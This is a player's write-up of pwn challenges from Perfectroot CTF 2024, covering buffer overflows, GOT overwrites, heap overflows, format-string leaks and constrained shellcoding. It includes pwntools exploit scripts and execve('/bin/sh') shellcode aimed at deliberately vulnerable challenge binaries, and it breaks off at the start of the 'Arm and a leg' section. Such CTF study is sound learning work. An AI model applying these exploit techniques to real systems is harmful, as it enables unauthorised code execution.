<h3> Perfectroot CTF 2024 </h3>

![image](https://github.com/user-attachments/assets/b55b9b6d-8b2c-429a-bd9f-b2542a787953)

Hey guys, 0x1337 here! Over the weekend I participated in this CTF with team `One Piece`

We ended up placing first so GGs to my team mates and every one
![image](https://github.com/user-attachments/assets/b15e30fe-d482-45c8-bd19-28aa3aad45a9)

I played as `ptr` btw
![image](https://github.com/user-attachments/assets/370d8198-f5fe-4c1a-ae6b-d950b1eff119)

I'm making this writeup because of the writeup contest lmao (i'm too tired to make it though)
![image](https://github.com/user-attachments/assets/6d9a5a42-50bc-4801-9c6c-94eae78b55a3)

Anyways I don't plan on making the solutions to all the challenges I solved but rather Pwn, Rev and Web
![image](https://github.com/user-attachments/assets/df755a22-23e7-4252-9e9e-b56a2228e82b)
![image](https://github.com/user-attachments/assets/cefac533-589c-4c64-b5de-707fc900547b)
![image](https://github.com/user-attachments/assets/6d01822d-971d-47d7-8673-fcbf0047cefc)

## Pwn
- Flow
- Nihil
- Daily Routine
- Heap Wars
- Heaps Don't Lie
- Sea Shells
- Arm and a Leg

## Rev
- Hackers Catch
- Re-Incarnation
- Hackers Catch 2
- Go Dark
- Box
- Pores

## Web
- Console-idation


### Pwn 7/8 :~

#### Flow
![image](https://github.com/user-attachments/assets/5fb6d5b0-074f-4859-bce8-c3a44eb5ddfb)

I downloaded the attached file and checking the file type shows this
![image](https://github.com/user-attachments/assets/a919c171-5503-44fa-a3dd-903e5eea7334)

So we're working with a 64bits executable which is dynamically linked and not stripped

From the protections shown by `checksec` we can see just `PIE and NX` enabled

Moving on, I ran the binary to get an overview of what it does
![image](https://github.com/user-attachments/assets/f618f612-f8a3-46ab-bd9b-14560fff5a3e)

It seems to receive our input then the program stops!

Okay time to reverse it, throwing it into IDA i get the main function
![image](https://github.com/user-attachments/assets/906e2ed7-f639-4366-8039-6d94c3aa6a63)

The main function just calls the `vulnerable` function, and here's the decompilation
![image](https://github.com/user-attachments/assets/ee2170fb-2efc-4cc7-8a16-012eaa349169)

```c
__int64 vulnerable()
{
  __int64 result; // rax
  _BYTE v1[60]; // [rsp+0h] [rbp-40h] BYREF
  int v2; // [rsp+3Ch] [rbp-4h]

  v2 = 12;
  printf("Enter a text please: ");
  result = __isoc99_scanf("%64s", v1);
  if ( v2 == 0x34333231 )
    return win();
  return result;
}
```

Okay looking at the pseudocode, we can see that:
- it defines a char array `v1` that can hold up 60 bytes of data
- a variable `v2` is initialized to 12
- after it receives our input which is then stored into `v1` it does a comparism that checks if `v2` equals `0x34333231`
- if the comparism returns True it calls the win function which basically prints the flag else it just returns

![image](https://github.com/user-attachments/assets/e6ad10a9-1703-4202-8f0d-6024b45d64dc)

Ok firstly the vulnerability is a 4 byte overflow and the reason is due to the program reading in at most 64 bytes into a buffer that can only hold up 60 bytes 

Our goal is to overwrite the v2 variable to the expected value because that check can never pass since v2 is initialized as 12

Looking at the stack view of the function we get this
![image](https://github.com/user-attachments/assets/009c5371-d5b6-4918-aa9a-c88d0d6b1e7d)

Basically after the buffer is the v2 variable, so this means if we fill up the buffer with 60 bytes the next 4 bytes will overwrite the check (v2) variable

So here's our goal:
- Fill up the buffer with junk 60 bytes
- Overwrite the v2 variable with 0x34333231
- Profit

Doing that i get the flag and here's my [solve script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Flow/solve.py)
![image](https://github.com/user-attachments/assets/bab0e779-c119-4d26-a361-c8fdb6818cdf)

```
Flag: r00t{fl0w_0f_c0ntr0l_3ngag3d_7391}
```

#### Nihil
![image](https://github.com/user-attachments/assets/9111315d-a14d-49eb-ac0d-fcd911e44099)

I downloaded the attached file and checking the file type shows this
![image](https://github.com/user-attachments/assets/031846f2-fbef-423f-a16b-7397d77c5079)

Pretty much same as before so i'm not repeating myself

I ran the binary to get an overview of what it does
![image](https://github.com/user-attachments/assets/d70d13a1-10cd-4bd0-a8c3-1a6a0bec277f)

Running it, we can see that it receives a number and a string before exiting 

Loading it in IDA here's the main function
![image](https://github.com/user-attachments/assets/ba731bb2-55a1-4405-b857-ac16e60b6407)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[16]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+10h] [rbp-10h]
  unsigned int v6; // [rsp+1Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  printf("How much did you get? ");
  fgets(s, 100, stdin);
  v6 = atoi(s);
  v5 = v6 + 1;
  puts("Any last words?");
  fgets(s, 100, stdin);
  if ( v5 < v6 )
  {
    printf("What, How did you beat me?");
    if ( v6 == 727 )
    {
      printf("Here is your flag: ");
      flag_file = fopen("flag.txt", "r");
      fgets(flag, 100, flag_file);
      puts(flag);
    }
    else
    {
      puts("Just kidding!");
    }
  }
  else
  {
    printf("Ha! I got %d\n", v5);
    puts("Maybe you will beat me next time");
  }
  return 0;
}
```

Let's understand what this does:
- first it reads in our input into variable `s`
- it then converts the string in `s` to an integer and stores the resulting int value into `v6`
- it sets `v5` to the `v6 + 1`
- receives our input again into variable `s`
- if the `v5` variable is less than `v6` it will compare the v6 with 727 and it's equal we get the flag else some error message

At first it might look like we just need to set our first input to 727 such that when it's converted we would pass the check

But that won't work because if we do that then v5 is set to `727 + 1 = 728` and the check done on `v5` to make sure it's less than `v6` won't return true because at that point v5 > v6 thereby giving us the error message

Now what's the bug? Well there's a buffer overflow on both the first & second read

It defines a char buffer `s` which can hold up at most `16` bytes of data, but during our read we actually `fgets` at most `100` bytes into the `s` buffer leading to an overflow

What can we do with this? 

Our goal is obviously to pass the check because doing that would give us the flag

Here's what i did

Notice how we have the overflow on our second read and basically at that point the v5 & v6 variables would already hold some value and there are going to be on the stack and we are still reading into the `s` variable

Now take a look at the stack of the function
![image](https://github.com/user-attachments/assets/6764f11d-0d3d-4196-a873-6b804cd95073)

Basically we can groom the stack such that we leverage the overflow and set those varaibles to any value we want

This is how my payload looks like:
- junk to just set v5 to a value (in order to reach second read)
- fill up the s variable with 16 bytes -> the next 8 bytes is the v5 variable so we overwrite that with a small value -> padding with 4 bytes -> next 4 bytes is the v6 variable and we set that to the expected value 727

Doing that should give us the flag and here's my [solve script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Nihil/solve.py)
![image](https://github.com/user-attachments/assets/3f362af2-c4c4-440a-8aa3-7b68f737b07f)

```
Flag: r00t{n0th1ng_t0_h1d3_wh3n_th3_fl0w_1s_nihil_9027}
```

#### Daily Routine
![image](https://github.com/user-attachments/assets/05ace08c-b350-4262-b872-bb901e4b697a)

Okay same process as always :)
![image](https://github.com/user-attachments/assets/9636fe7d-fe53-436a-8546-6450ac2c772a)

This time around we are actually given the libc, linker and Dockerfile
![image](https://github.com/user-attachments/assets/d25ae2f5-fbe3-40b2-be86-530366db16bb)

Just to be on a safe side I always patch the binary to use the libc given with pwninit that's to make sure it uses the same libc as the one being used on the remote instance

```
pwninit --bin challenge --libc libc.so.6 --ld ld-linux-x86-64.so.2 --no-template
```

Back to the protections from the result of running checksec we can see that only NX is enabled

Moving on I ran the binary to get an overview of what it does
![image](https://github.com/user-attachments/assets/327a1894-a530-48eb-8d43-b3d080cbe5d3)

Well well, there are so many options

We can try play around but I just decided to reverse it 

Throwing it in IDA we get the main function
![image](https://github.com/user-attachments/assets/7b09356a-1dc0-4d4f-b034-699f4b1852ae)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)get_choice(14LL) )
    {
      case 1u:
        eat_breakfast();
      case 2u:
        brush_my_teeth();
        break;
      case 3u:
        tweet_inject();
        break;
      case 4u:
        meditate();
        break;
      case 5u:
        free_palestine();
        break;
      case 6u:
        podcast_time();
        break;
      case 7u:
        play_warzone();
        break;
      case 8u:
        pet_the_cat();
        break;
      case 9u:
        take_a_shower();
        break;
      case 0xAu:
        make_the_bed();
        break;
      case 0xBu:
        watch_youtube_videos();
        break;
      case 0xCu:
        play_guitar();
        break;
      case 0xDu:
        read_notes();
        break;
      case 0xEu:
        take_notes();
        break;
      default:
        continue;
    }
  }
}
```

First it calls the `init` function which disables buffering on `stdin & stdout`
![image](https://github.com/user-attachments/assets/d69b699e-e3e3-467a-9d3f-1984bedd3e87)

In a while loop it calls the `menu` function which basically prints out the menu available
![image](https://github.com/user-attachments/assets/f5055a0d-3b36-40de-bd62-e7b5c2928929)

Next it calls the `get_choice` function passing `14` as the parameter
![image](https://github.com/user-attachments/assets/0c1f598b-b146-49d2-afb2-bf51cb7b8bdd)

So what this function does is to basically read in an integer and make sure that it's within the available function based on the switch cases (making sure it's greater than 0 and less than or equal to 14)

This is what the `read_int` function does
![image](https://github.com/user-attachments/assets/bb6e4371-64c1-43b1-8cb7-9a72bc400178)

Basically it reads in our input which is the choice we want from the menu then it null terminates it and converts it to a long int

Based on the choice provided it switches to the cases

Most of the functions there based on the case are not useful so i'll show some relevant ones

Case 1:
![image](https://github.com/user-attachments/assets/e9a10a1a-9ec2-4815-b555-357a745acb01)

- At first that might look like an overflow because we are reading at most 0x4000 bytes into variable `s` which is a buffer that can hold up 256 bytes
- But then it calls `print_message()` on `s`
- And what that does is to print the content stored in s and exit()

![image](https://github.com/user-attachments/assets/66b1c0a9-ebe8-4c80-a95a-d90b04899b24)

- Because it exits therefore we don't have control over the return address so this is not useful

Case 3:
![image](https://github.com/user-attachments/assets/1eaac0b9-004f-4d77-be52-91504efc464a)

- It allocates a pointer of size pointed by global variable `injection_size` and stores the memory address in variable `s`
- Reads our input into `s` of at most 7 bytes (injection_size = 7)
- Allocates another pointer of (16 + 7) bytes
- Generates a string: "unset PATH; echo $s"
- Copy the string into the newly allocated memory
- Calls `system` on the value stored in the address

Ok this looks good basically it would read our input let's say we give it: `abcd` then the final command passed into `system` is `unset PATH; echo "abcd"`

Since we can control what to echo we can do a command injection but take into consideration that the environment variable PATH is unset so we have to fully specify the full path to the executable we want to run or set the PATH variable again

But thinking of that we can't pretty much do that for now because our input length is limited to just 7 bytes and that's not enough to apply what we want

Keep in mind that the size to be allocated with malloc is also used as the size when reading input into the allocated memory, and this size is actually a global variable

Case 12:
![image](https://github.com/user-attachments/assets/4b539558-b52b-4c2e-b044-a8fd1eacef81)

- It reads in our input which is stored in variable s
- Opens the file specified by `s`
- Prints the content of the file specified to stdout

Basically this function is used for reading a file

At this point you might be like why not just read the flag? 

That would work! (I didn't even notice this during the ctf i used another way 😄)

But notice that if you tried communicate with the program and read a file via terminal it won't work
![image](https://github.com/user-attachments/assets/a3359286-be0c-4845-8bc3-4d8dbfc47123)

This is because a newline is sent with our filename and `fgets()` would read it therefore `open` would also attempt reading the filename which is already appended with a newline which is going to return -1 because such file doesn't exist

To fix this you need to add a null byte at the end of the filename because fgets stops at a null byte 

This is how you'd do it in pwntools

```python
from pwn import *

io = remote("94.72.112.248", "5050")

io.sendlineafter(b">", b"12")
io.sendline(b"flag.txt\x00")

io.interactive()
```

Doing that works!
![image](https://github.com/user-attachments/assets/23582cae-9754-4342-80ce-d5c56d348be7)

But now that wasn't how i solved it (i just even found that now while making the writeup)

So let's continue looking through the important functions

Case 14:
![image](https://github.com/user-attachments/assets/49b1a4f4-cc94-4359-8007-400bf9780436)

- Calls `read_int()` and assigns the returned value to the variable `v1`.
- It then calls `read_int()` a second time and assigns the returned value to the array `pretty_large_array` at the index specified by `v1`.

The `read_int()` basically is used to convert a string to a long int

The caveat is that it doesn't explicitly define v1 as an unsigned long int, meaning we can set v1 to a negative value, thereby causing an out-of-bounds write

Now we have a primitive that can let us make OOB write what next?

At this point during the time I was solving it i immediately decided to target the global offset table because it was writable since `RELRO was disabled`

To calculate the offset from the `pretty_large_array` global variable to any of our specified got address we simple subtract it

```
(got_addr - pretty_large_array) // 8 (diving by 8 because of the way it accesses the array -> does it based on the size which is 8 bytes)
```

Next thing is what got address should we overwrite and what should we overwrite it to?

My main goal was spawning a shell:

```
system("/bin/sh")
```

So I need a function such that when called it uses our user control input as the first parameter

Looking through I found a perfect function `strcspn` which is only used in `read_int`
![image](https://github.com/user-attachments/assets/9de99f71-c6f6-42c1-861c-9bd4504ad385)

So after the call to `fgets` our input would be stored in `s`, then `strcspn` is used to null terminate our input, and as we can see our input variable is passed as the first parameter

If we overwrite that to system rather than it calling `strcspn` it would do `system`

With that as our goal here's my exploit [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Daily%20Routine/solve.py)

Running it works
![image](https://github.com/user-attachments/assets/7dca908e-9510-4be1-8c1d-2415c2db1ebb)

Another way of solving this rather than a GOT overwrite is to overwrite the `injection_size` to a large value such that we would be able to break out of the `quote` do a command injection to directly call `/bin/sh`

```
Flag: r00t{At_th4t_r4t3_Y0u_mu5t_b3_5t4lk1n9_m3_3ac1294}
```

#### Heap Wars
![image](https://github.com/user-attachments/assets/5b3b80a8-93a7-47fd-91e2-d52a7e2a1743)

Usual file type & protection check process
![image](https://github.com/user-attachments/assets/424ef429-272c-4dd5-a4fd-942ba28bcd0e)

Nothing out of the ordinary

Running it we get this
![image](https://github.com/user-attachments/assets/a3a13534-044a-4a47-8653-cade4b76c0e1)

Seems we have 4 options to choose from

Loading it in IDA here's the main function
![image](https://github.com/user-attachments/assets/10a9ec2c-24e2-4b13-847a-3f2b6a46466e)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  int v5; // [rsp+18h] [rbp-128h] BYREF
  int v6; // [rsp+1Ch] [rbp-124h]
  char *dest; // [rsp+20h] [rbp-120h]
  void *ptr; // [rsp+28h] [rbp-118h]
  char s[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v10; // [rsp+138h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setup();
  dest = malloc(0x40uLL);
  ptr = malloc(8uLL);
  *ptr = darthVader;
  v6 = 1;
  while ( v6 )
  {
    puts("====== Jedi Training Menu ======");
    puts("1. Enter your Jedi code");
    puts("2. Jedi data");
    puts("3. Jedi next bounty");
    puts("4. Exit");
    printf("Enter your choice: ");
    if ( __isoc99_scanf("%d", &v5) != 1 )
    {
      puts("Invalid input! Please enter a number.");
      while ( getchar() != 10 )
        ;
    }
    if ( v5 == 4 )
    {
      puts("Exiting the program. May the Force be with you!");
      v6 = 0;
    }
    else
    {
      if ( v5 > 4 )
        goto LABEL_17;
      switch ( v5 )
      {
        case 3:
          printf("Jedi bounty: %p\n", ptr);
          break;
        case 1:
          printf("Enter your Jedi code: ");
          getchar();
          if ( !fgets(s, 256, stdin) )
          {
            perror("Error reading input");
            exit(1);
          }
          v3 = dest;
          strcpy(dest, s);
          (*ptr)(v3);
          puts("Jedi code saved.");
          break;
        case 2:
          printf("Jedi data: %p\n", dest);
          break;
        default:
LABEL_17:
          puts("Invalid choice! Please select a valid option.");
          break;
      }
    }
  }
  free(dest);
  free(ptr);
  return 0;
}
```

So let's understand what it does:
- First it does some memory allocation via a call to `malloc`
- The first call is allocating a chunk of size `0x40`
- The second call is allocating a chunk of size `0x8` and it sets the value at that address to the function address of `darthVader`
- In a while loop it prints the menu and we can select from choice 1 - 4

Choice 4:
- Breaks out of the loop
- Deallocates the memory via a call to `free`

Choice 3:
- Leaks the heap address of the second allocated memory `ptr`

Choice 2:
- Leaks the heap address of the first allocated memory `dest`

Choice 1:
- Reads in at most 256 bytes into the stack variable `s` which can hold up to 264 bytes ( so no overflow here)
- Copies the value stored in `s` into the heap chunk `dest`
- Calls the function stored in `ptr` passing the address of `dest` as parameter

From this the bug is a heap overflow and the reason is because during the allocation it specifies that it wants `64` bytes of data but during the part where it moves our input value from the stack to the heap is makes use of `strcpy` which is a vulnerable function because it doesn't check the size of src which is been moved to dest

What now?

Well since we know that the value stored in ptr is a function pointer and it's going to be executed after the strcpy we can use the heap overflow to overwrite the function pointer to any value

But what value should we overwrite it to?

Looking through the available functions i saw a win function called `theForce`
![image](https://github.com/user-attachments/assets/b8205786-051f-48ad-ac6f-3538f5d6e167)

So we just overwrite the function pointer on the heap to that and profit!

To calculate the offset needed to reach the pointer i did it dynamically

- Set a breakpoint at main+381 (this is the point where it does a strcpy)
- Go to the next instruction
- vis_heap_chunks to get a visualization on how the heap chunks are (this is a pwndbg command)

![image](https://github.com/user-attachments/assets/a5aec816-53e4-4424-b566-5d47d2452019)

We can see our input starts at: 0x4052a0 and the function pointer is at: 0x4052f0

So we just subtract it:
= 0x4052f0 - 0x4052a0
= 80
= 80 - 8 = 72

Now we just pad with 72 bytes chunk then the next 8 bytes is the function pointer which we would overwrite

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Heap%20Wars/solve.py)
![image](https://github.com/user-attachments/assets/a27f804c-a1e7-4069-88c7-c554e5eeb41a)


```
Flag: r00t{h34p_0v3rfl0w_1n_th3_f0rc3_1ebfe9e04a01ac4b00d4bd194b1bd505}
```

#### Heaps Don't Lie 
![image](https://github.com/user-attachments/assets/fba99779-0358-41a1-b654-f5835fc25952)

Checking the file type shows this
![image](https://github.com/user-attachments/assets/f7de4756-0380-4912-b1c8-2c4a5aae08e0)

Ok this time around we see that all protections are enabled

Since the libc, linker and Dockerfile was provided I patched the binary to use the same libc provided, but later on i figured it wasn't using the right libc as the remote instance for some reason which lead me to build a docker container with the Dockefile and i extracted the libc from there which worked.

Running it to get an overview of what it does shows this
![image](https://github.com/user-attachments/assets/eb7e57e0-c0e2-463f-86d1-6b36cc31ccba)

It seems to receive our input twice and prints it out before the program returns

Loading it up in IDA here's the main function
![image](https://github.com/user-attachments/assets/516971e3-1a21-449c-b8d7-c1dec00e7939)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  Dance *ptr1; // [rsp+8h] [rbp-18h]
  Dance *ptr2; // [rsp+10h] [rbp-10h]

  ptr1 = dance(select_tune);
  printf("Default tune : ");
  printf(ptr1->name, argv);
  printf("Tune: ");
  (ptr1->func)(ptr1);
  putchar(10);
  ptr2 = dance(select_style);
  printf("Style: ");
  (ptr2->func)(ptr2);
  printf("And so, the dance stops.");
  free(ptr1);
  free(ptr2);
  return 0;
}
```

Note that I already had to create a struct to make it more readable, here's my struct definition
![image](https://github.com/user-attachments/assets/ea020d6d-8e44-48f2-a9d0-8d04a2785eba)

```c
struct Dance {
  char name[32];
  long *func;
};
```

Now let us understand what it does:
- It calls the dance function setting the parameter to the address of `select_tune`

![image](https://github.com/user-attachments/assets/29181160-c25a-49ef-ba2d-a6708863f9e6)

```c
Dance *__fastcall dance(__int64 *func)
{
  Dance *chunk; // [rsp+10h] [rbp-10h]

  chunk = malloc(40uLL);
  mprotect((chunk & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);
  chunk->func = func;
  fgets(chunk->name, 48, _bss_start);
  return chunk;
}
```

- What this does is to allocate some dynamic memory of size 40 bytes and the pointer to that memory is stored into variable `chunk`
- Next it changes the permission of the newly allocated memory to read, write and execute via a call to mprotect
- It then sets `chunk->func` to the address of `select_tune` which was the parameter passed into it
- Then it reads in our input of at most 48 bytes into `chunk->name`
- Finally it returns the pointer to the allocated memory

Back to the main function
- The pointer to the allocated memory is stored into variable `ptr1`
- It then prints out `ptr1->name`
- And it calls the funtion pointed by `ptr1->func` passing `ptr1` as the parameter
- It repeats this step again
- Then it finally frees the memory allocated and returns

Now what's the vulnerability?

Well there are two vulnerabilities:
- Heap overflow
- Format string bug

The heap overflow exists because we are reading at most 48 bytes into `chunk->name`  which can only hold up 32 bytes of data

While the format string bug is because it prints the content of `chunk->name` without using a format specifier

Ok what now?

Our goal is to get code execution and how i went about it was using the format string bug (fsb) to leak pointers to the libc region which enabled me to calculate the libc base address hence letting me know where `system` resides in libc

Next i used the heap overflow to modify the function pointer of the second chunk to be allocated to that of `system` such that when the function pointer is about to be executed it would rather call `system` rather than `select_tune`

To leak libc, I set a breakpoint at `main+78`, which is just before the program calls `printf(ptr1->name)`. This allows me to inspect the stack for libc pointers.
![image](https://github.com/user-attachments/assets/0c670f5a-9d47-404a-b51b-a7bc0a48ceda)
![image](https://github.com/user-attachments/assets/bfcb8a2b-abad-4b68-996d-e92e42a1854e)

Offset 11 holds a libc address and we can confirm by checking the memory region that address resides in
![image](https://github.com/user-attachments/assets/8c147dff-252d-4337-9352-3e86364cea2a)

Now to calculate the base of libc we need to get the offset from our leak to the libc base which we can easily do by subtracting it
![image](https://github.com/user-attachments/assets/7454fed4-6b27-4796-ae08-4051226c8816)

```
x/gx 0x7f467b42a1ca-0x7f467b400000 = 0x2a1ca
```

This means that whenever we leak the pointer at stack offset 11 we would get a libc address then when we subtract it with `0x2a1ca` we'd get the libc base

Ok now what? we now need to set `chunk->func` to `system` by filling up `chunk->name[32]` and the next 8 bytes will be `chunk->func`

Now when the function pointer is about to be executed it would do `ptr2->func()(ptr2)` so at this point `ptr2->func` would be `system` but we need `ptr2` to be `/bin/sh` 

To do that we just set the first 8 bytes to be `/bin/sh\x00` then is effectively does: `system("/bin/sh")`

Doing that works, here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Heaps%20Dont%20Lie/solve.py)
![image](https://github.com/user-attachments/assets/97db2295-35c4-4707-904c-60716cf13fb8)

```
Flag: r00t{M4yb3_50m3t1m35_th3y_d0_l13_3e50dde}
```

But now the way i initially tried solving this was by shellcode injection which worked locally but for some reason when the binary is executed using `socat` it just doesn't work

Anyways this is how i did it:
- I leaked the heap address and then calculated the offset from our current leak to that of the second allocated memory
- Used the heap overflow to modify `ptr2->func` to the heap address of `ptr2`, but i didn't fill `ptr2->name[32]` with junk but rather my shellcode
- When the function pointer is about to be executed it calls `ptr2->func` which now points to `ptr2` which basically contains our shellcode
- Profit!

This is the solve here:
![image](https://github.com/user-attachments/assets/3ab01d37-365e-46f1-aa8a-b67243663484)

```python
def solve():

    io.sendline(b"%7$p.%11$p.%15$p")
    io.recvuntil(b"tune : ")
    addr = io.recvline().split(b".")

    heap_leak = int(addr[0], 16)
    libc.address = int(addr[1], 16) - 0x2a1ca
    exe.address = int(addr[2].strip(), 16) - 0x1332

    buf = heap_leak + 0x1450
    
    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)
    info("heap buf: %#x", buf)

    sc = asm("""
            xor eax, eax
            mov al, 0x3b
            lea rdi, [rip+sh]
            xor esi, esi
            xor edx, edx
            syscall
            
            sh:
                .ascii "/bin/sh"
                .byte 0
        """)

    payload = sc.ljust(0x20, asm("nop")) + p64(buf)

    io.sendline(payload)

    io.interactive()
```

#### Sea Shells
![image](https://github.com/user-attachments/assets/1cf85aa1-9305-4f3c-ba5b-3414743357d0)

Checking the file type and protections shows this
![image](https://github.com/user-attachments/assets/85558bcb-55be-4ff1-bc8e-99a8f4a7a9aa)

Running it to get an overview of what it does shows this
![image](https://github.com/user-attachments/assets/a4f1a334-054c-40d4-9c7c-6a829304d301)

We have 7 options to choose from and on choosing option 7 the program crashes

Loading it in IDA shows this
![image](https://github.com/user-attachments/assets/e3d3e155-e9a4-40b8-bcdc-d12097e9d58d)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void (*shellcode)(void); // rax
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rbx
  __int64 v19; // rbx
  __int64 v20; // rbx
  char s[128]; // [rsp+20h] [rbp-A0h] BYREF
  void (*sc)(void); // [rsp+A0h] [rbp-20h]
  int choice; // [rsp+A8h] [rbp-18h]
  int idx; // [rsp+ACh] [rbp-14h]

  init();
  puts("Welcome aboard Captain, please help us steer this ship!\n");
  idx = 0;
  while ( 1 )
  {
    puts("What should we do?");
    puts("1) Steer to the left");
    puts("2) Steer to the right");
    puts("3) Hoist the sails!");
    puts("4) Full speed ahead!");
    puts("5) Secure the lines.");
    puts("6) Anchor down!");
    puts("7) Throw the lines!");
    if ( !fgets(s, 128, stdin) )
      return 0;
    choice = atoi(s);
    switch ( choice )
    {
      case 1:
        if ( --idx < 0 )
          idx = 0;
        break;
      case 2:
        if ( ++idx > 0xFF )
          idx = 0;
        break;
      case 3:
        steer[idx] += 22;
        break;
      case 4:
        steer[idx] += 100;
        break;
      case 5:
        steer[idx] += 15;
        break;
      case 6:
        steer[idx] -= 9;
        break;
      case 7:
        puts("OK, let's dock this ship!");
        shellcode = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
        v22 = shellcode;
        v5 = qword_4048;
        *shellcode = *steer;
        *(shellcode + 1) = v5;
        v6 = qword_4058;
        *(shellcode + 2) = qword_4050;
        *(shellcode + 3) = v6;
        v7 = qword_4068;
        *(shellcode + 4) = qword_4060;
        *(shellcode + 5) = v7;
        v8 = qword_4078;
        *(shellcode + 6) = qword_4070;
        *(shellcode + 7) = v8;
        v9 = qword_4088;
        *(shellcode + 8) = qword_4080;
        *(shellcode + 9) = v9;
        v10 = qword_4098;
        *(shellcode + 10) = qword_4090;
        *(shellcode + 11) = v10;
        v11 = qword_40A8;
        *(shellcode + 12) = qword_40A0;
        *(shellcode + 13) = v11;
        v12 = qword_40B8;
        *(shellcode + 14) = qword_40B0;
        *(shellcode + 15) = v12;
        v13 = qword_40C8;
        *(shellcode + 16) = qword_40C0;
        *(shellcode + 17) = v13;
        v14 = qword_40D8;
        *(shellcode + 18) = qword_40D0;
        *(shellcode + 19) = v14;
        v15 = qword_40E8;
        *(shellcode + 20) = qword_40E0;
        *(shellcode + 21) = v15;
        v16 = qword_40F8;
        *(shellcode + 22) = qword_40F0;
        *(shellcode + 23) = v16;
        v17 = qword_4108;
        *(shellcode + 24) = qword_4100;
        *(shellcode + 25) = v17;
        v18 = qword_4118;
        *(shellcode + 26) = qword_4110;
        *(shellcode + 27) = v18;
        v19 = qword_4128;
        *(shellcode + 28) = qword_4120;
        *(shellcode + 29) = v19;
        v20 = qword_4138;
        *(shellcode + 30) = qword_4130;
        *(shellcode + 31) = v20;
        sc();
        break;
      default:
        continue;
    }
  }
}
```

Yikes! Anyways let us understand what it does:
- Calls the `init` function which disables buffering on `stdin & stdout`
- Initializes the `idx` variable to `0`

In a while loop it does this:
- Prints the menu
- Receives our input which is the choice and converts it to an integer
- Option 1: decrements idx by 1, checks if it's less than 0, and sets idx to 0 if true.
- Option 2: it increments idx by 1, checks if it's greater than 255, and sets idx to 0 if true.
- Option 3: increments the current value of `steer` specified at `idx` by 22
- Option 4: increments the current value of `steer` specified at `idx` by 100
- Option 5: increments the current value of `steer` specified at `idx` by 15
- Option 6: decrements the current value of `steer` specified at `idx` by 9
- Option 7: creates a new mapping in the virtual address space of the calling process with read, write, and execute permissions using a call to mmap, then it copies all byte from `steer` into the new memory allocated and executes the content in it

Ok great, this is a shellcoding challenge but with a twist

The twist is that we can't directly set the value at `steer[idx]` to the byte we want

But notice that we can control the index by using option 1 or 2 and that even if we can't directly control the byte at that index we can make use of option 3 to 6 to set it to what we want

Now here's where things began to get tough

Our goal is obvious, fill up `steer` with our shellcode and execute it with option 7

But since we can't just set the byte directly we need to make use of:
- steer[idx] += 22
- steer[idx] += 100
- steer[idx] += 15
- steer[idx] -= 9

I spent a lot of time trying to write an algorithm that generates all valid numbers to set the byte to our desired value but i failed awfully

Next i wrote a mathematical representation which represents the way we'd set our byte:

```
22a + 100b + 15c + (256 - 9)d = value % 256
```

I tried use:
- brute force
- linear congruence

But sadly i failed at that

After some while i remembered [Z3](https://github.com/Z3Prover/z3) which is an SAT Solver

Using that worked perfectly 

```python
def create(val):
    s = Solver()
    a = BitVec("a", 8)
    b = BitVec("b", 8)
    c = BitVec("c", 8)
    d = BitVec("d", 8)

    s.add((a * 0x16) + (b * 0x64) + (c * 0xF) + (d * (0x100 - 9)) == val)
    
    if s.check() == sat:
        m = s.model()
        a = m[a].as_long()
        b = m[b].as_long()
        c = m[c].as_long()
        d = m[d].as_long()
        return [a, b, c, d]
```

Now we can easily write our shellcode byte to the steer array

Doing that works and here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Sea%20Shells/solve.py)
![image](https://github.com/user-attachments/assets/84785e07-b4f9-446a-975c-5153220a219c)

```python
def solve():

    sh = asm("""
        execve:
            lea rdi, [rip+sh]
            xor esi, esi
            xor edx, edx
            xor eax, eax
            mov al, 0x3b
            syscall
            
        sh:
             .ascii "/bin/sh"
             .byte 0
        """)

    sc = asm("""
            mov rsi, rdx
            add rsi, 0x50
            mov rdx, 0x100
            syscall
            call rsi
    """)

    for byte in sc:
        a, b, c, d = create(byte)

        for _ in range(a):
            io.recvuntil(b"lines!")
            io.sendline(b"3")

        for _ in range(b):
            io.recvuntil(b"lines!")
            io.sendline(b"4")

        for _ in range(c):
            io.recvuntil(b"lines!")
            io.sendline(b"5")
    
        for _ in range(d):
            io.recvuntil(b"lines!")
            io.sendline(b"6")
    
        io.recvuntil(b"lines!")
        io.sendline(b"2")

    io.sendline(b"7")
    io.sendline(sh)
```

It also works remotely but the thing is that it takes time

For me during the time i solved it, it took about 30minutes and one condition causing that is likely network latency, nevertheless i got the flag

####  Arm and a leg 
![image](https://github.com/user-attachments/assets/8ada2e4f-f6ea-4137-9b02-0a15fcb6e8fd)

I enjoyed this challenge because this is my first arm rop and it took me quite a while 

Checking the file type and protection shows this
![image](https://github.com/user-attachments/assets/63be40e1-119d-4aae-8dd2-ea181f0d4036)

We are working with a 32 bit arm executable which is dynamically linked and not stripped

